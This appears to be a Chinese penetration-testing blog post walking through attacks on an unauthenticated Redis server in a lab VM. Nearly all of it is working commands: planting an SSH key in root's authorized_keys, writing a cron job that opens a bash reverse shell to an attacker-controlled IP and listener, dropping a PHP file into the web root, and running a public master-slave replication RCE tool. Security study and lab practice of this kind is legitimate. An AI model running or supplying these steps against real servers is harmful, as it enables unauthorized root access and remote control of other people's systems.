---
title: "Redis Attack"
date: 2020-05-24T20:52:03+08:00
draft: flase
tags: [渗透测试]
categories: []
comment: true
---
Redis攻击
<!--more-->

# Redis攻击

- 环境搭建

*在虚拟机中搭建redis服务*
![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200524175624.png)

- 测试连接 

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200524180324.png)

## 写ssh-keygen公钥登陆

- 首先在本地生产公私钥文件

```
ssh-keygen –t rsa
```

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200524194700.png)

- 公钥写入 key.txt 文件

```
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > test.txt
```
![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200524195047.png)

- 连接 Redis 写入文件

```
cat test.txt | redis-cli -h 192.168.1.103 -x set crackit
redis-cli -h 192.168.1.103
config set dir /root/.ssh/
config get dir
config set dbfilename "authorized_keys"
save
```

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200524200329.png)

- 私钥登陆

```
ssh -i id_rsa root@192.168.1.103
```

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200524200456.png)

## 利用计划任务执行命令反弹shell

- 监听一个端口

```
nc -lvvp 6666
```

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200524200813.png)

- 写入反弹shell

```
set x "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/192.168.1.101/6666 0>&1\n\n"
config set dir /var/spool/cron/
config set dbfilename root
save
```

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200524201145.png)

- 反弹shell

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200524201238.png)

## WEB目录写webshell

- 写shell

```
config set dir /var/www/html/
config set dbfilename shell.php
set x "<?php phpinfo();?>"
save
```

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200524201441.png)

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200524201742.png)

## 基于主从复制的RCE

- 影响范围

```
Redis 4.x/5.x
```

- 工具下载地址
 
```
https://github.com/jas502n/Redis-RCE.git
```

- 主从利用

```
python redis-rce.py -r 192.168.1.103 -p 6379 -L 192.168.1.101 -f exp_lin.so
```

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200524204257.png)
